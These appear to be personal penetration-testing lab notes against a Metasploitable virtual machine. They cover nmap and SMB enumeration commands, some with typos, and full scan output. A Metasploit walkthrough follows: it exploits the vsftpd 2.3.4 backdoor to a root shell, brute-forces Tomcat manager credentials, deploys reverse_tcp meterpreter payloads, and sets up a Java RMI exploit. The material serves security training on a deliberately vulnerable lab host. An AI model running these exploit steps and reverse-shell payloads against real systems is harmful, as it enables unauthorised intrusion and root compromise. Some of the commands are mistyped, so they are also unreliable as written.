
# nmap -T4 --top-ports 50 -sV -O --osscan-limit --isscan-guess --min-hostgroup 128 --host-timeout 10m -oA ms-scan -iL ip_list.org


# grep " open " ms-scan | sed -d 's/ +/ g/' | sort | uniq -c | sorn -rn 


# nmap -v -O -sV -T4 --osscan-guess -oA ms-smbscan 
--script=smb-enum-domains, sum-enum-processes, smb-enum-sessions, sum-enum-shares, shm-enum-users, smb-os-discover, 
smb-security-mode, smb-system-info <Targets IPs>


====================================================DEMO========================================
nmap -sV -O 192.168.56.101 -p1-65535
---
Nmap scan report for 192.168.56.101
Host is up (0.00040s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  shell       Netkit rshd
1099/tcp  open  rmiregistry GNU Classpath grmiregistry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
50660/tcp open  nlockmgr    1-4 (RPC #100021)
51902/tcp open  mountd      1-3 (RPC #100005)
51912/tcp open  unknown
58876/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:CB:B6:57 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.44 seconds
---

Services
========
21/tcp    open  ftp         vsftpd 2.3.4
-----------------------------------------
VSFTPD 2.3.4
------------
cd /usr/share/nmap/scripts
ls | grep -i ftp

nmap --script ftp-vsftpd-backdoor 192.168.56.101

root@kali:/usr/share/nmap/scripts# nmap --script ftp-vsftpd-backdoor 192.168.56.101

Starting Nmap 7.40 ( https://nmap.org ) at 2017-11-29 21:12 CST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.101
Host is up (0.000077s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  OSVDB:73573
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|_      http://osvdb.org/73573
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 08:00:27:CB:B6:57 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds

------

Exploit using Metasploit
========================
# msfconsole

msf > use exploit/unix/ftp/vsftpd_234_backdoor


msf > use exploit/unix/ftp/vsftpd_234_backdoor 

msf exploit(vsftpd_234_backdoor) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic


msf exploit(vsftpd_234_backdoor) > set TARGET 0
TARGET => 0

msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(vsftpd_234_backdoor) >



msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(vsftpd_234_backdoor) > 

-----
msf exploit(vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.56.101   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(vsftpd_234_backdoor) >
-------
msf exploit(vsftpd_234_backdoor) > exploit

[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.101:21 - USER: 331 Please specify the password.
[+] 192.168.56.101:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.102:38733 -> 192.168.56.101:6200) at 2017-11-29 21:20:28 -0600

----------
id
uid=0(root) gid=0(root)
python -c 'import pty; pty.spawn("/bin/bash")'
root@metasploitable:/#

=================================DEMO==============================================================

8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
---------------------------------------------------------------
# msfconsole

msf > search tomcat

msf > use auxiliary/scanner/http/tomcat_mgr_login

msf auxiliary(tomcat_mgr_login) >


msf auxiliary(tomcat_mgr_login) > show options


msf auxiliary(tomcat_mgr_login) > set RHOSTS 192.168.56.101
msf auxiliary(tomcat_mgr_login) > set RPORT 8180


msf auxiliary(tomcat_mgr_login) > show options
-----------
tomcat:tomcat valid credential


msf auxiliary(tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy) > show options


---SET PAYLOAD---
msf exploit(tomcat_mgr_deploy) > set payload linux/x86/meterpreter/reverse_tcp

msf exploit(tomcat_mgr_deploy) > set HttpPassword tomcat
msf exploit(tomcat_mgr_deploy) > set HttpUsername tomcat

msf exploit(tomcat_mgr_deploy) > exploit
msf exploit(tomcat_mgr_deploy) > show options

==== SCANNER MODULE ===
# msfconsole

msf > use auxiliary/scanner/mysql/mysql_login
msf > show options

msf > set RHOSTS 192.168.56.101

========================================================================================================
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)

========================================================================================================
1099/tcp  open  rmiregistry GNU Classpath grmiregistry

# msfconsole

msf > search java_rmi_server

msf > use auxiliary/scanner/misc/java_rmi_server
msf > show options
msf > set RHOSTS 192.168.56.101
msf > run

Exploit
=======

msf > use exploit/multi/misc/java_rmi_server
msf exploit(java_rmi_server) > show options

msf exploit(java_rmi_server) > set payload java/meterpreter/reverse_tcp
msf exploit(java_rmi_server) > show options

msf exploit(java_rmi_server) > set LHOST 192.168.56.102





